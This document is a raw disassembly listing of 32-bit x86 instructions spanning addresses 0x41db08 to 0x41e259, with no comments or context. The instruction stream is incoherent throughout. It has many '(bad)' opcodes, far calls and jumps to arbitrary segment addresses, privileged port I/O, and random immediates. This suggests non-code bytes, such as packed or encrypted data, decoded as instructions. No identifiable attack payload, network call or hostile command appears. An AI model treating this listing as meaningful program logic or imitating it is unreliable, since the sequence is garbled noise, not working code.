  41db08:	bound  edx,QWORD PTR [edi+0xb]
  41db0b:	call   0xf6d9:0xa6d762cf
  41db12:	imul   ebp,DWORD PTR [edi-0x123766b6],0x233e262d
  41db1c:	adc    edx,edi
  41db1e:	adc    dh,BYTE PTR cs:0xe24232b
  41db25:	in     al,0xc6
  41db27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db28:	xchg   esi,eax
  41db29:	pop    edx
  41db2a:	into   
  41db2b:	mov    bh,0x24
  41db2d:	inc    esp
  41db2e:	dec    esi
  41db2f:	rol    DWORD PTR [esi],1
  41db31:	sbb    ch,BYTE PTR [bp+di+0x768e]
  41db36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db37:	call   0xe8b5e8ac
  41db3c:	mov    esi,0xc037673a
  41db41:	dec    edx
  41db42:	push   cs
  41db43:	cmp    eax,0x6849153b
  41db48:	icebp  
  41db49:	les    esp,FWORD PTR ds:0x8749e9ae
  41db4f:	add    eax,0xe9727923
  41db54:	pop    eax
  41db55:	xchg   esp,eax
  41db56:	lods   eax,DWORD PTR ds:[esi]
  41db57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db58:	repnz popa 
  41db5a:	xor    cl,BYTE PTR [esi-0x6f]
  41db5d:	test   eax,0x44ed1556
  41db62:	retf   
  41db63:	aad    0x3d
  41db65:	fwait
  41db66:	jl     0x41dbe2
  41db68:	inc    ecx
  41db69:	jp     0x41dbca
  41db6b:	pusha  
  41db6c:	popa   
  41db6d:	sbb    DWORD PTR [ebp-0x42],esi
  41db70:	std    
  41db71:	test   al,0x46
  41db73:	cld    
  41db74:	mov    bh,0x85
  41db76:	jo     0x41dba4
  41db78:	mov    eax,0x6c607920
  41db7d:	mov    eax,ds:0xa55172bf
  41db82:	inc    esp
  41db83:	das    
  41db84:	jno    0x41db9f
  41db86:	and    eax,0xfc06b85f
  41db8b:	pop    esi
  41db8c:	fstp   QWORD PTR [ecx-0x5f438b93]
  41db92:	xchg   ebp,eax
  41db93:	pusha  
  41db94:	(bad)  
  41db95:	sbb    bl,bl
  41db97:	xchg   edx,eax
  41db98:	push   cs
  41db99:	adc    dh,BYTE PTR [ecx-0xd]
  41db9c:	aaa    
  41db9d:	xchg   ebp,eax
  41db9e:	ret    
  41db9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dba0:	lea    esp,[ebx-0x44]
  41dba3:	mov    eax,0x7f0cd786
  41dba8:	in     al,dx
  41dba9:	arpl   WORD PTR [edi-0x5c],bx
  41dbac:	or     eax,0x1e911d92
  41dbb1:	push   ecx
  41dbb2:	adc    DWORD PTR [ebx+0x326c480d],ebp
  41dbb8:	lods   eax,DWORD PTR fs:[esi]
  41dbba:	mov    ebx,0x609ff90a
  41dbbf:	add    eax,0x32c8127b
  41dbc4:	pop    esi
  41dbc5:	bound  ecx,QWORD PTR [eax-0x4f]
  41dbc8:	lods   al,BYTE PTR ds:[esi]
  41dbc9:	inc    ebx
  41dbca:	jmp    0xfb97:0xccb6f1cc
  41dbd1:	xor    al,0xe7
  41dbd3:	cmp    BYTE PTR [eax-0x2b0ef0fa],bl
  41dbd9:	xchg   edx,eax
  41dbda:	sbb    BYTE PTR [ebp+0x67],ch
  41dbdd:	popa   
  41dbde:	aaa    
  41dbdf:	adc    al,0x88
  41dbe1:	shr    BYTE PTR [ebx-0x5e14148a],0x44
  41dbe8:	sbb    BYTE PTR [ebx],bl
  41dbea:	push   0x8402a22
  41dbef:	enter  0x686b,0x60
  41dbf3:	dec    ebp
  41dbf4:	xchg   ecx,eax
  41dbf5:	or     DWORD PTR [ecx-0x411ef33a],ecx
  41dbfb:	(bad)  
  41dbfc:	and    eax,0xc74237e1
  41dc01:	jbe    0x41db8c
  41dc03:	or     dl,BYTE PTR es:[ecx+0xdcce0c7]
  41dc0a:	rcr    DWORD PTR [esp+ecx*2+0x6272f70b],1
  41dc11:	jae    0x41dc2b
  41dc13:	jge    0x41dbdf
  41dc15:	shl    esi,cl
  41dc17:	sub    BYTE PTR [ebx+edx*8],0xe9
  41dc1b:	aas    
  41dc1c:	mov    dl,0x12
  41dc1e:	(bad)  
  41dc1f:	stc    
  41dc20:	test   DWORD PTR [eax],ebp
  41dc22:	mov    ebp,DWORD PTR [esi]
  41dc24:	(bad)  [esi+0x3ba1557e]
  41dc2a:	je     0x41dbf1
  41dc2c:	inc    eax
  41dc2d:	jle    0x41dc01
  41dc2f:	imul   edx,DWORD PTR [ecx],0xffffff8d
  41dc32:	cmp    al,0x46
  41dc34:	adc    bl,BYTE PTR [edi]
  41dc36:	shl    esp,cl
  41dc38:	xchg   esi,eax
  41dc39:	int3   
  41dc3a:	enter  0x4f81,0x44
  41dc3e:	cmp    esi,DWORD PTR [esi-0x47550a33]
  41dc44:	mov    bl,0x21
  41dc46:	call   0x9a89:0xcb4c34d6
  41dc4d:	mov    bl,0x6a
  41dc4f:	jmp    0x4f00:0x300e5091
  41dc56:	cld    
  41dc57:	xlat   BYTE PTR ds:[ebx]
  41dc58:	loop   0x41dc84
  41dc5a:	or     eax,0xa288eb95
  41dc5f:	fdivp  st(5),st
  41dc61:	adc    bl,bl
  41dc63:	test   eax,0x39c6a375
  41dc68:	dec    eax
  41dc69:	loope  0x41dc3f
  41dc6b:	clc    
  41dc6c:	jp     0x41dc9f
  41dc6e:	xor    bh,BYTE PTR [edi-0x364b6e1c]
  41dc74:	mov    dh,0xbf
  41dc76:	push   ds
  41dc77:	jne    0x41dcd3
  41dc79:	jmpw   0x4b97
  41dc7d:	pop    ds
  41dc7e:	jp     0x41dc36
  41dc80:	mov    eax,0xccd68811
  41dc85:	retf   
  41dc86:	nop
  41dc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc8a:	lahf   
  41dc8b:	test   al,0x67
  41dc8d:	add    ebp,edx
  41dc8f:	mov    esp,0x4d805717
  41dc94:	pop    ds
  41dc95:	jnp    0x41dc39
  41dc97:	add    ecx,esi
  41dc99:	repnz fwait
  41dc9b:	jnp    0x41dcc8
  41dc9d:	or     al,0xad
  41dc9f:	stc    
  41dca0:	sbb    eax,0x96d63b60
  41dca5:	scas   eax,DWORD PTR es:[edi]
  41dca6:	ins    DWORD PTR es:[edi],dx
  41dca7:	jmp    0x6aa5:0x287f517f
  41dcae:	pop    ebx
  41dcaf:	out    0x36,al
  41dcb1:	cdq    
  41dcb2:	daa    
  41dcb3:	mov    bl,0xaa
  41dcb5:	jecxz  0x41dc67
  41dcb7:	test   BYTE PTR [edx+0x6b],bh
  41dcba:	and    eax,0xec0912e7
  41dcbf:	fadd   DWORD PTR [ebp+0x3f]
  41dcc2:	mov    esp,0xc8827161
  41dcc7:	cld    
  41dcc8:	pop    ecx
  41dcc9:	les    esp,FWORD PTR [edx+0x4cdc59ba]
  41dccf:	ffree  st(6)
  41dcd1:	ja     0x41dd52
  41dcd3:	clc    
  41dcd4:	sub    BYTE PTR [ebp+0x1b],bh
  41dcd7:	xor    ebp,DWORD PTR [ebp+0x6df34147]
  41dcdd:	in     eax,dx
  41dcde:	cld    
  41dcdf:	sub    al,0x72
  41dce1:	or     BYTE PTR [ebx+0x19],ch
  41dce4:	mov    bl,0x2d
  41dce6:	inc    edi
  41dce7:	fs push ebx
  41dce9:	sahf   
  41dcea:	xchg   BYTE PTR [ebx],dl
  41dcec:	hlt    
  41dced:	and    eax,0x33f179f3
  41dcf2:	(bad)  
  41dcf3:	das    
  41dcf4:	rcl    esp,1
  41dcf6:	mov    edi,0x5e26297a
  41dcfb:	popa   
  41dcfc:	push   eax
  41dcfd:	mov    esi,0xede302d9
  41dd02:	aaa    
  41dd03:	pop    edi
  41dd04:	int3   
  41dd05:	lods   eax,DWORD PTR ds:[esi]
  41dd06:	push   ebp
  41dd07:	das    
  41dd08:	fisub  WORD PTR [edx]
  41dd0a:	pop    esi
  41dd0b:	shl    edx,cl
  41dd0d:	inc    edx
  41dd0e:	and    eax,0x48caa04f
  41dd13:	sub    al,BYTE PTR [ebx]
  41dd15:	fdivr  QWORD PTR [edi-0x5978e946]
  41dd1b:	add    DWORD PTR [ebx],edx
  41dd1d:	adc    eax,0xa8ae290b
  41dd22:	lock xor ebx,DWORD PTR [eax]
  41dd25:	xchg   ecx,eax
  41dd26:	mov    ebp,0x71196711
  41dd2b:	(bad)  
  41dd2c:	dec    ebp
  41dd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd2e:	(bad)  
  41dd2f:	outs   dx,BYTE PTR ds:[esi]
  41dd30:	imul   esi,DWORD PTR [edx],0x20
  41dd33:	or     eax,0x29c7cc7d
  41dd38:	xlat   BYTE PTR ds:[ebx]
  41dd39:	dec    eax
  41dd3a:	mov    ah,0x18
  41dd3c:	sub    eax,0x3eff738a
  41dd41:	sub    DWORD PTR [esi],ebx
  41dd43:	cld    
  41dd44:	idiv   ah
  41dd46:	add    edi,DWORD PTR [ecx+edx*8-0x12]
  41dd4a:	int    0x30
  41dd4c:	dec    edx
  41dd4d:	int    0xec
  41dd4f:	loope  0x41ddad
  41dd51:	call   edx
  41dd53:	in     eax,dx
  41dd54:	jecxz  0x41dcfc
  41dd56:	jb     0x41dce4
  41dd58:	sar    BYTE PTR [ebx+0x4a630b30],cl
  41dd5e:	jecxz  0x41dd86
  41dd60:	cmp    dl,BYTE PTR [ebp-0x6fe38a1d]
  41dd66:	addr16 xor bh,al
  41dd69:	stos   DWORD PTR es:[edi],eax
  41dd6a:	or     DWORD PTR [ecx+0x223e5f26],edi
  41dd70:	pop    esi
  41dd71:	xchg   DWORD PTR [edx-0x72efa398],ebp
  41dd77:	add    esi,ecx
  41dd79:	rcl    al,cl
  41dd7b:	mov    eax,ds:0xc61d8499
  41dd80:	inc    DWORD PTR [ebp-0x68759545]
  41dd86:	in     al,0x77
  41dd88:	xor    eax,0x775ea3f5
  41dd8d:	pop    es
  41dd8e:	icebp  
  41dd8f:	ss lahf 
  41dd91:	mov    ebp,0x2f67a16
  41dd96:	mov    edi,edx
  41dd98:	xor    eax,0xc8f11c72
  41dd9d:	mov    BYTE PTR [ebx-0x79762f05],al
  41dda3:	loopne 0x41dd66
  41dda5:	adc    ch,BYTE PTR [ebx+0x219c57b1]
  41ddab:	(bad)  
  41ddac:	pop    edx
  41ddad:	loop   0x41de2b
  41ddaf:	lea    esi,[edi-0x796b7690]
  41ddb5:	pop    esi
  41ddb6:	mov    BYTE PTR [eax],dl
  41ddb8:	dec    edx
  41ddb9:	jne    0x41ddbe
  41ddbb:	inc    ecx
  41ddbc:	rol    DWORD PTR [ecx+0x1b],1
  41ddbf:	jg     0x41de21
  41ddc1:	dec    BYTE PTR [esi-0x53]
  41ddc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddc5:	or     bl,ah
  41ddc7:	adc    eax,DWORD PTR [bx]
  41ddca:	scas   al,BYTE PTR es:[edi]
  41ddcb:	mov    ecx,0xb12141ae
  41ddd0:	push   ebp
  41ddd1:	test   al,0x55
  41ddd3:	lahf   
  41ddd4:	lods   al,BYTE PTR ds:[esi]
  41ddd5:	mov    esp,0xd054c754
  41ddda:	adc    dl,BYTE PTR [ecx+0x7d31a967]
  41dde0:	in     eax,0x97
  41dde2:	dec    eax
  41dde3:	mov    ch,0xf2
  41dde5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dde6:	les    edx,FWORD PTR [ebp+0x50]
  41dde9:	jne    0x41dd85
  41ddeb:	push   edx
  41ddec:	cmp    BYTE PTR [ecx-0x40],0xf6
  41ddf0:	mov    gs,WORD PTR [ecx]
  41ddf2:	(bad)  
  41ddf3:	and    ch,BYTE PTR [esi-0x45]
  41ddf6:	rcl    BYTE PTR [ebx-0xfaefa09],0xd
  41ddfd:	imul   esp,esi,0x6b
  41de00:	int    0x4b
  41de02:	fisubr WORD PTR [esi+ecx*8-0x69]
  41de06:	lods   eax,DWORD PTR ds:[esi]
  41de07:	lock lock add BYTE PTR [ecx],ah
  41de0b:	loop   0x41de68
  41de0d:	test   eax,0x6d1c3909
  41de12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de13:	cmp    ebp,DWORD PTR [ebp-0x69]
  41de16:	lock nop
  41de18:	pop    esp
  41de19:	dec    ecx
  41de1a:	loop   0x41de0f
  41de1c:	fwait
  41de1d:	retf   
  41de1e:	mov    al,0x87
  41de20:	aaa    
  41de21:	jp     0x41de6f
  41de23:	jecxz  0x41de2d
  41de25:	push   ebp
  41de26:	inc    edx
  41de27:	add    BYTE PTR [edi+0x4e],0xb7
  41de2b:	fmul   DWORD PTR [edi+ebp*4]
  41de2e:	dec    esp
  41de2f:	stos   BYTE PTR es:[edi],al
  41de30:	repnz aaa 
  41de32:	jge    0x41dde4
  41de34:	dec    ebx
  41de35:	add    al,0xd0
  41de37:	sbb    DWORD PTR [edx],0xfffffffa
  41de3a:	mov    ebx,0xf4b99536
  41de3f:	mov    gs,WORD PTR [eax*4+0x2528348d]
  41de46:	sbb    eax,0xfee60a9a
  41de4b:	in     al,dx
  41de4c:	call   0x14117f56
  41de51:	aas    
  41de52:	clc    
  41de53:	je     0x41de3d
  41de55:	mov    cl,0x24
  41de57:	inc    esp
  41de58:	jne    0x41ded1
  41de5a:	add    ecx,ecx
  41de5c:	sar    DWORD PTR [eax+0x7d],0x2a
  41de60:	dec    ecx
  41de61:	(bad)  
  41de62:	fsub   st,st(1)
  41de64:	bnd jno 0x41de71
  41de67:	add    eax,esi
  41de69:	xchg   ecx,esi
  41de6b:	and    al,0xef
  41de6d:	add    al,0x6f
  41de6f:	pushf  
  41de70:	ret    
  41de71:	sub    bl,BYTE PTR [eax-0x29]
  41de74:	and    ecx,0x292ee76b
  41de7a:	loope  0x41dec6
  41de7c:	adc    BYTE PTR [edx+0x2c5c6810],0xb5
  41de83:	jecxz  0x41de10
  41de85:	sbb    DWORD PTR [edi+0x3cd41b47],ebx
  41de8b:	sbb    al,0xe9
  41de8d:	mov    edx,0x318c5fe4
  41de92:	xchg   esp,eax
  41de93:	js     0x41deb7
  41de95:	push   ecx
  41de96:	mov    edx,0x9e77d667
  41de9b:	jmp    0xb211:0xf1adf240
  41dea2:	and    esp,ecx
  41dea4:	jge    0x41de71
  41dea6:	pop    edx
  41dea7:	sbb    ebx,DWORD PTR [ecx]
  41dea9:	sbb    ch,dh
  41deab:	ins    DWORD PTR es:[edi],dx
  41deac:	inc    eax
  41dead:	aad    0x32
  41deaf:	pop    ebx
  41deb0:	in     al,dx
  41deb1:	loop   0x41de55
  41deb3:	test   al,0x0
  41deb5:	and    eax,0xde1a14a5
  41deba:	(bad)  
  41debb:	xchg   esp,eax
  41debc:	xchg   ebp,eax
  41debd:	leave  
  41debe:	loope  0x41defc
  41dec0:	jp     0x41ded3
  41dec2:	pop    eax
  41dec3:	sbb    dl,BYTE PTR [edx+ebp*8]
  41dec6:	adc    al,0x35
  41dec8:	jnp    0x41de96
  41deca:	retf   
  41decb:	inc    edi
  41decc:	(bad)  
  41decd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dece:	sbb    bh,BYTE PTR [edx]
  41ded0:	mov    dh,0xbd
  41ded2:	test   BYTE PTR [edi+0x46d7c1f5],0x8e
  41ded9:	xor    bh,BYTE PTR [edx-0x3a]
  41dedc:	fsubr  DWORD PTR [ecx+0x44]
  41dedf:	stos   BYTE PTR es:[edi],al
  41dee0:	and    esp,DWORD PTR [ebp-0x38]
  41dee3:	gs ins BYTE PTR es:[edi],dx
  41dee5:	pop    ecx
  41dee6:	cmp    ebx,ecx
  41dee8:	xchg   edi,eax
  41dee9:	inc    ebp
  41deea:	pusha  
  41deeb:	arpl   WORD PTR [ecx-0x64],bx
  41deee:	imul   esp,DWORD PTR [ebp+0x4c],0x619bf9b5
  41def5:	dec    ebx
  41def6:	out    dx,al
  41def7:	xor    bl,BYTE PTR [eax-0x38610f70]
  41defd:	div    DWORD PTR [edx-0x17]
  41df00:	pop    ds
  41df01:	inc    ebx
  41df02:	sub    al,0x83
  41df04:	je     0x41df24
  41df06:	add    ah,BYTE PTR [eiz*8-0x68d8caf8]
  41df0d:	push   ds
  41df0e:	xor    eax,0xeac4997f
  41df13:	retf   0x358
  41df16:	jmp    0x83322701
  41df1b:	pop    ebx
  41df1c:	int3   
  41df1d:	cld    
  41df1e:	fwait
  41df1f:	loopne 0x41defb
  41df21:	or     DWORD PTR [eax-0x23],ecx
  41df24:	fild   DWORD PTR [ebx]
  41df26:	pop    edi
  41df27:	and    esi,edx
  41df29:	leave  
  41df2a:	ins    DWORD PTR es:[edi],dx
  41df2b:	inc    esp
  41df2c:	aad    0xc7
  41df2e:	cli    
  41df2f:	mov    eax,ds:0xff6e89db
  41df34:	mov    ah,0xf5
  41df36:	cmp    al,0xf0
  41df38:	fsub   QWORD PTR [ebx-0x3dcf925c]
  41df3e:	into   
  41df3f:	sbb    BYTE PTR [ebx+0x64967f20],ah
  41df45:	arpl   si,sp
  41df47:	or     al,bl
  41df49:	scas   al,BYTE PTR es:[edi]
  41df4a:	and    ah,BYTE PTR [esi-0x4b28add3]
  41df50:	dec    eax
  41df51:	(bad)  
  41df53:	lea    eax,[eax+0x21]
  41df56:	inc    ecx
  41df57:	xchg   ecx,eax
  41df58:	in     eax,0x8c
  41df5a:	xchg   edi,eax
  41df5b:	out    dx,al
  41df5c:	push   cs
  41df5d:	fistp  QWORD PTR [ebx-0x21]
  41df60:	lea    edx,[eax-0xa]
  41df63:	popa   
  41df64:	xor    bl,BYTE PTR [esi]
  41df66:	sub    al,0x4d
  41df68:	std    
  41df69:	adc    BYTE PTR [ebp-0x7dbc813e],ch
  41df6f:	out    dx,al
  41df70:	add    bl,BYTE PTR [ebx]
  41df72:	mov    eax,0xb44a7865
  41df77:	int    0xbc
  41df79:	in     al,dx
  41df7a:	stos   BYTE PTR es:[edi],al
  41df7b:	cmp    BYTE PTR [edi],al
  41df7d:	popf   
  41df7e:	or     BYTE PTR [ebx],0x8d
  41df81:	shl    BYTE PTR [ebp+ecx*4-0xc669ebc],1
  41df88:	ins    BYTE PTR es:[edi],dx
  41df89:	cmp    DWORD PTR [eax+eiz*8-0x47],0xffffffc6
  41df8e:	fldcw  WORD PTR [ebp-0x67]
  41df91:	call   0x6106:0xec27c35b
  41df98:	es das 
  41df9a:	(bad)  
  41df9c:	outs   dx,DWORD PTR ds:[esi]
  41df9d:	lods   al,BYTE PTR ds:[esi]
  41df9e:	ret    
  41df9f:	mov    ecx,edx
  41dfa1:	retf   
  41dfa2:	inc    edx
  41dfa3:	sbb    dh,BYTE PTR [ecx]
  41dfa5:	fcomp  DWORD PTR ds:0x8b5f3950
  41dfab:	(bad)  
  41dfac:	fbstp  TBYTE PTR [esi+0x2e]
  41dfaf:	or     ebp,DWORD PTR ds:0xce75dc5e
  41dfb5:	ret    0xb22c
  41dfb8:	sub    al,0xd6
  41dfba:	icebp  
  41dfbb:	ret    0xdaee
  41dfbe:	add    BYTE PTR [eax+0x18],0x7
  41dfc2:	add    DWORD PTR [ebx+0x30],esi
  41dfc5:	mov    DWORD PTR [ebx+0x32],eax
  41dfc8:	je     0x41df7e
  41dfca:	je     0x41df88
  41dfcc:	cmp    al,0xf3
  41dfce:	mov    eax,ds:0xdae2918c
  41dfd3:	test   DWORD PTR [ebx+0x79],esp
  41dfd6:	(bad)  
  41dfd7:	in     eax,0xbb
  41dfd9:	lds    ebx,FWORD PTR [edi]
  41dfdb:	or     BYTE PTR [eax+edx*1],al
  41dfde:	jns    0x41dfc7
  41dfe0:	lock xchg edi,eax
  41dfe2:	pop    ebx
  41dfe3:	inc    edx
  41dfe4:	pushf  
  41dfe5:	push   0x84ac4203
  41dfea:	rcr    DWORD PTR [edx+eiz*4+0x62],1
  41dfee:	mov    bh,0x8f
  41dff0:	(bad)  
  41dff2:	ud2    
  41dff4:	es mov al,0x5
  41dff7:	call   0x1f48377e
  41dffc:	(bad)  
  41dffd:	jge    0x41e055
  41dfff:	sbb    BYTE PTR ds:0x372855db,0x42
  41e006:	outs   dx,DWORD PTR ds:[esi]
  41e007:	fs push ecx
  41e009:	xor    al,0xa9
  41e00b:	stos   DWORD PTR es:[edi],eax
  41e00c:	xor    al,0x71
  41e00e:	bound  ebp,QWORD PTR [edx+edx*4+0x2cf18a5a]
  41e015:	and    ah,cl
  41e017:	and    cl,dh
  41e019:	ins    BYTE PTR es:[edi],dx
  41e01a:	fcmovnu st,st(1)
  41e01c:	ror    ch,cl
  41e01e:	mov    BYTE PTR [esi+0x2cb8813a],al
  41e024:	xor    BYTE PTR [edx],dl
  41e026:	or     al,0xab
  41e028:	aaa    
  41e029:	sub    cl,al
  41e02b:	xchg   edi,eax
  41e02c:	mov    dl,0x99
  41e02e:	inc    ebp
  41e02f:	js     0x41e044
  41e031:	xchg   ebx,eax
  41e032:	cwde   
  41e033:	pop    ecx
  41e034:	push   ebp
  41e035:	inc    ebx
  41e036:	call   0xf6b27b3a
  41e03b:	sub    ebx,DWORD PTR [eax+0x3d]
  41e03e:	(bad)  
  41e03f:	data16 (bad) ds:0xb11cb971
  41e046:	jp     0x41dfcd
  41e048:	aam    0x9
  41e04a:	mov    edx,0x1b07d465
  41e04f:	call   0x8a94:0x577dcfc8
  41e056:	and    BYTE PTR [ecx],cl
  41e058:	psubsb mm1,QWORD PTR [ebp+0x6ae0a7e3]
  41e05f:	scas   al,BYTE PTR es:[edi]
  41e060:	mov    ah,0xe8
  41e062:	je     0x41dfea
  41e064:	dec    ecx
  41e065:	out    dx,al
  41e066:	nop
  41e067:	jl     0x41e006
  41e069:	sahf   
  41e06a:	sub    al,0x76
  41e06c:	lahf   
  41e06d:	int    0xaa
  41e06f:	pop    ecx
  41e070:	xor    DWORD PTR [ebp-0x3d3732c8],0xdf818190
  41e07a:	push   es
  41e07b:	shl    DWORD PTR [eax+0x7c],cl
  41e07e:	push   ecx
  41e07f:	or     eax,0xc72b7461
  41e084:	sbb    eax,0x5cf305c
  41e089:	nop
  41e08a:	cmc    
  41e08b:	std    
  41e08c:	lahf   
  41e08d:	mov    al,0x6c
  41e08f:	push   esi
  41e090:	(bad)  
  41e091:	sahf   
  41e092:	push   cs
  41e093:	mov    ebp,0x8f9ef15d
  41e098:	lock fld TBYTE PTR [edx+0x7b]
  41e09c:	fistp  DWORD PTR [esi+0x3c]
  41e09f:	(bad)  
  41e0a1:	das    
  41e0a2:	bound  esp,QWORD PTR ds:0xb6ae1226
  41e0a8:	stos   DWORD PTR es:[edi],eax
  41e0a9:	pop    ss
  41e0aa:	int    0xe7
  41e0ac:	push   edx
  41e0ad:	sub    eax,0xf612f3ac
  41e0b2:	jns    0x41e070
  41e0b4:	mov    cl,dh
  41e0b6:	xlat   BYTE PTR ds:[ebx]
  41e0b7:	(bad)  
  41e0b9:	xor    al,0x71
  41e0bb:	icebp  
  41e0bc:	outs   dx,DWORD PTR ds:[esi]
  41e0bd:	lods   al,BYTE PTR ds:[esi]
  41e0be:	adc    eax,0x745be437
  41e0c3:	repnz mov ecx,0x9823b005
  41e0c9:	fiadd  DWORD PTR [ecx]
  41e0cb:	jns    0x41e063
  41e0cd:	and    ch,BYTE PTR [edi+0x1ab1b444]
  41e0d3:	jp     0x41e063
  41e0d5:	xchg   edx,eax
  41e0d6:	and    al,0xce
  41e0d8:	xchg   BYTE PTR [edx],dh
  41e0da:	sub    eax,0x501e8581
  41e0df:	push   ss
  41e0e0:	jnp    0x41e0f6
  41e0e2:	jns    0x41e10a
  41e0e4:	mov    esi,DWORD PTR [edi]
  41e0e6:	(bad)  
  41e0e8:	shl    BYTE PTR [eax],cl
  41e0ea:	addr16 cmp al,0xbf
  41e0ed:	(bad)  
  41e0ee:	popa   
  41e0ef:	jne    0x41e072
  41e0f1:	push   0xffffffc7
  41e0f3:	xchg   ebp,eax
  41e0f4:	in     eax,dx
  41e0f5:	test   WORD PTR [edx-0x37d57712],si
  41e0fc:	pop    ds
  41e0fd:	pop    eax
  41e0fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0ff:	test   BYTE PTR gs:[edi],dl
  41e102:	aad    0x9f
  41e104:	lahf   
  41e105:	cmp    ch,BYTE PTR [edx-0x4908e831]
  41e10b:	add    edx,DWORD PTR [eax]
  41e10d:	loop   0x41e17b
  41e10f:	push   edi
  41e110:	dec    eax
  41e111:	pushf  
  41e112:	and    bl,BYTE PTR [edi]
  41e114:	daa    
  41e115:	xor    ah,BYTE PTR [eax]
  41e117:	mov    dh,0xef
  41e119:	xlat   BYTE PTR ds:[ebx]
  41e11a:	xor    dh,dl
  41e11c:	dec    edx
  41e11d:	sti    
  41e11e:	adc    al,0x6a
  41e120:	fsub   QWORD PTR [ecx-0x80bb1af]
  41e126:	mov    edx,0x106ca232
  41e12b:	push   es
  41e12c:	sbb    bh,BYTE PTR [ebx-0x3e]
  41e12f:	sub    al,0x10
  41e131:	jns    0x41e134
  41e133:	sbb    ebx,0xdfe28e7f
  41e139:	push   edx
  41e13a:	or     al,0xc7
  41e13c:	mov    al,ds:0x752d92
  41e141:	xchg   esp,eax
  41e142:	jno    0x41e0df
  41e144:	out    0x59,al
  41e146:	adc    al,0x5c
  41e148:	in     al,dx
  41e149:	ret    
  41e14a:	pop    ebx
  41e14b:	fwait
  41e14c:	sub    dl,BYTE PTR [eax-0x8d350b9]
  41e152:	shl    BYTE PTR [esi-0x40cb3572],1
  41e158:	ss sbb esp,edx
  41e15b:	mov    al,0x24
  41e15d:	or     ah,BYTE PTR [ebp+0x7f]
  41e160:	and    al,0xf1
  41e162:	jb     0x41e1d6
  41e164:	icebp  
  41e165:	sub    ecx,DWORD PTR [edi+0x3f]
  41e168:	push   esi
  41e169:	push   0x219a9dd2
  41e16e:	adc    BYTE PTR [edx],0x77
  41e171:	jp     0x41e142
  41e173:	sub    al,0x5d
  41e175:	stos   BYTE PTR es:[edi],al
  41e176:	jmp    0x2d036486
  41e17b:	shl    dl,1
  41e17d:	das    
  41e17e:	push   ebp
  41e17f:	mov    eax,ds:0x7908af74
  41e184:	dec    ebx
  41e185:	ss jo  0x41e111
  41e188:	popf   
  41e189:	es aas 
  41e18b:	xchg   ecx,eax
  41e18c:	xchg   bh,al
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	sub    ebx,eax
  41e191:	jne    0x41e1cc
  41e193:	cs cld 
  41e195:	jmp    0x314431c5
  41e19a:	push   edx
  41e19b:	popa   
  41e19c:	adc    cl,BYTE PTR [edi+0x7697de23]
  41e1a2:	pop    esi
  41e1a3:	aad    0x49
  41e1a5:	mov    edi,0x3354bc0e
  41e1aa:	xlat   BYTE PTR ds:[ebx]
  41e1ab:	(bad)  
  41e1ac:	cmp    al,0x2a
  41e1ae:	push   esi
  41e1af:	aad    0x7b
  41e1b1:	jns    0x41e231
  41e1b3:	pop    ecx
  41e1b4:	dec    edx
  41e1b5:	lds    eax,FWORD PTR [eax]
  41e1b7:	cmp    ch,bh
  41e1b9:	mov    bl,0x98
  41e1bb:	sbb    ah,BYTE PTR [esi+0x6c]
  41e1be:	data16 stos BYTE PTR es:[edi],al
  41e1c0:	mov    ah,0x46
  41e1c2:	dec    ebp
  41e1c3:	xor    eax,0x38275ad2
  41e1c8:	inc    edx
  41e1c9:	cmp    BYTE PTR [esi+0x71],bl
  41e1cc:	(bad)  
  41e1cd:	or     esp,eax
  41e1cf:	imul   edi,eax,0xce110843
  41e1d5:	cmp    ch,BYTE PTR [edi]
  41e1d7:	mov    esp,0x9f6c8f61
  41e1dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1dd:	icebp  
  41e1de:	fistp  WORD PTR [eax-0x32]
  41e1e1:	mov    ds:0x1304b1ac,eax
  41e1e6:	dec    esp
  41e1e7:	addr16 push ebp
  41e1e9:	mov    ebp,0x10ba0689
  41e1ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1ef:	xlat   BYTE PTR ds:[ebx]
  41e1f0:	icebp  
  41e1f1:	xchg   edx,eax
  41e1f2:	fst    QWORD PTR [ebx+0x55]
  41e1f5:	cmp    BYTE PTR fs:[edx+ebx*2-0x2bcf5ed],0x21
  41e1fe:	mov    ?,esi
  41e200:	outs   dx,DWORD PTR ds:[esi]
  41e201:	push   cs
  41e202:	fisub  WORD PTR [esi+ebx*2]
  41e205:	mov    dh,0xa1
  41e207:	pop    esp
  41e208:	fst    QWORD PTR [esi+0x7e64e0cd]
  41e20e:	sti    
  41e20f:	(bad)  
  41e211:	xor    BYTE PTR [eax+0x50],bh
  41e214:	pop    edi
  41e215:	ret    
  41e216:	call   0xf049:0x8257deae
  41e21d:	pop    ebx
  41e21e:	inc    ebx
  41e21f:	mov    bl,0x26
  41e221:	xor    ah,BYTE PTR [eax]
  41e223:	add    al,0x4d
  41e225:	icebp  
  41e226:	aas    
  41e227:	xor    eax,0xf050ab01
  41e22c:	mov    WORD PTR [ebp+0x46],?
  41e22f:	rol    DWORD PTR [ecx],cl
  41e231:	pop    ds
  41e232:	add    eax,eax
  41e234:	sbb    al,0xd7
  41e236:	mov    ebp,0xf9631f9b
  41e23b:	arpl   WORD PTR [edi-0x1f],ax
  41e23e:	fistp  WORD PTR [esp+edx*8-0x72]
  41e242:	dec    ebp
  41e243:	xchg   edx,eax
  41e244:	std    
  41e245:	fst    QWORD PTR [ebp+0x29b3e001]
  41e24b:	jo     0x41e258
  41e24d:	stos   DWORD PTR es:[edi],eax
  41e24e:	bnd jae 0x41e237
  41e251:	shl    BYTE PTR [esi],0xb0
  41e254:	or     bl,dl
  41e256:	jmp    0x41e2b1
  41e258:	pop    edi
  41e259:	jo     0x41e218
